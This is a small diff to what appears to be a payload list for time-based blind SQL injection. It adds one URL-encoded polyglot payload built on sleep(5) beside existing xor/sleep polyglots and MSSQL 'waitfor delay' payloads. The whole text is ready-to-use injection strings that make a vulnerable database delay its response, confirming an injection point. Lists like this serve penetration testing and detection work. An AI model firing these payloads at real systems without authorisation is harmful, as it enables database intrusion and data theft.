@@ -9,6 +9,7 @@ payload
 `11%0axor(sleep(5))%23'xor(sleep(5))%23"xor(sleep(5))%23'`
 `5%0axor%0asleep(5)/*'xor%0asleep(5)xor%0a'"xor%0asleep(5)xor%0a"*/`
 `5%0a-%0asleep(5)/*'-%0asleep(5)-%0a'"-%0asleep(5)-%0a"*/`
+`5%2b-%20sleep(5)/*'-%20sleep(5)-%20'"-%20sleep(5)-%20"*/`
 
 `') waitfor delay '0:0:5' --`
 `) waitfor delay '0:0:5' --`
